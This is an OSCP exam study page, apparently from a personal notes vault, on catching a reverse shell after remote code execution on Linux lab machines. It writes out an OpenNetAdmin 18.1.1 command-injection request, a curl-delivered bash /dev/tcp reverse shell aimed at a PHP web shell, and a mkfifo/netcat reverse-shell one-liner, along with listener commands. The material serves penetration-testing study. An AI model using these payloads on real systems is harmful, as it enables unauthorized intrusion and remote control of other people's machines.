# Linux - RCE to Shell

**Step 11 of 50 · Linux**

*Run a confirmed remote exploit and catch the resulting shell.*

## Run this

> **Why:** This version or banner check identifies the exact product release before a matching public exploit is considered.
```bash
nc -lnvp $Lport
perl $ExploitFile $BoxIP
python3 $ExploitFile $BoxIP
```

## Example output

 > *Example shape only: the exact exploit invocation is not yet verified against a real box.*
```
[+] Exploit sent
listening on 0.0.0.0 $Lport ...
connect to 10.10.10.1 from 10.10.10.2
$ whoami
username
```
## What did you get?

- [ ] A reverse shell connects to the listener → **Run `id` in the received shell, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The exploit opens a bind shell on the target → **Set `$Port` to the bind-shell port, run `nc -nv $BoxIP $Port`, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The shell comes back as root → **Run `id` and `whoami` to confirm UID 0, record the proof path privately, and go to Step 21 · [[Linux - Clean Down]]**
- [ ] The exploit returns an error → **Copy the complete error into `$BoxDir/loot/exploit-error.txt`, then go to Step 10 · [[Linux - Exploit Search]]**
- [ ] A shell connects but has no job control → **Go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] No callback after multiple attempts → **Run `sudo tcpdump -ni tun0 'host $BoxIP and tcp'`, try the documented bind-shell command, then retry the reverse shell on `$ListenPort` only once**

## OpenNetAdmin 18.1.1 command injection

For OpenNetAdmin 18.1.1, the vulnerable `xajaxargs[]=ip=>` parameter accepts a shell command. Validate it with identity output before sending a callback, then extract only the text between markers from the XML response.

> **Why:** This request proves command execution as the web-service account while keeping the response readable.
```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" \
  http://$BoxIP/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

> [!warning] 💡
> A `/dev/tcp` payload requires Bash. If the injected command is interpreted by `/bin/sh`, use the FIFO and netcat payload from the shell section instead.

## PHP web-shell reverse callback

After a phpbash-style endpoint returns command output, send the callback through the same POST parameter. Start the listener first, use URL encoding for the complete command, and discard the HTTP response because the shell is the useful result.

> **Why:** The listener is ready before the web request launches Bash, preventing a fast callback from being missed.
```bash
nc -lvnp $Port
curl -sS -X POST --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" "http://$BoxIP/$Path" >/dev/null
```

> [!warning] 💡
> `/dev/tcp` requires Bash. If the endpoint invokes `/bin/sh` or the callback fails, use a POSIX FIFO plus netcat payload and URL-encode the complete body.

## Notes

Only run the interpreter command that matches the exploit file. For reverse shells use RevShells to generate the payload matching the available interpreter (`bash`, `python3`, `perl`, `php`).

## Gotcha

> [!warning] 💡
> The exact exploit invocation depends on the discovered service. If it was not tested in the write-ups, confirm it before relying on it.

> [!warning] 💡
> If the payload uses `/dev/tcp` syntax, it requires bash. Shells that run via `/bin/sh` (e.g. from PostgreSQL `COPY TO PROGRAM`, some CGI handlers) will silently fail on bash-only payloads. Use a mkfifo or nc-based payload instead: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LocalIP $Lport > /tmp/f`

> [!warning]
> Command not yet verified against a real box. Confirm the exact exploit interpreter, arguments, and listener port before relying on this page in an exam.
## Fragile custom-server callback

Custom servers may accept one connection, require a null terminator, and crash after a malformed request. Prepare the listener first, send the reviewed payload once, and keep the triggering socket open briefly if the shellcode starts through that connection.

> **Why:** Separating listener setup from payload delivery prevents a valid callback from being missed and avoids consuming a single-shot service with a port check.
```bash
nc -lnvp $Lport
python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
```

> [!warning] 💡
> Do not run `nc -z`, `curl`, or another readiness probe against a single-shot overflow service. Reset the box after a crash, then retry only after the listener is ready.

## Additional routing

- [ ] A callback arrives from a custom PE service → **Run `id`, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The service crashes with no callback → **Reset the service or box, verify the callback address and bad characters offline, then retry once**
- [ ] The service is root-owned and exposed after foothold → **Run `ss -lntp` from the shell, retrieve the binary, and repeat Step 10 · [[Linux - Exploit Search]]**
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/Bratarina|Bratarina]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/clamAV|clamAV]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- authenticated plugin upload produced a reverse shell
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- ONA command injection produced a FIFO/netcat reverse shell
- [[OSCP/BOXES/WRITE UPS/Linux/Dawn2|Dawn2]] -- custom PE service overflow produced a Linux reverse shell under Wine
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- phpbash POST callback produced a `www-data` shell

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
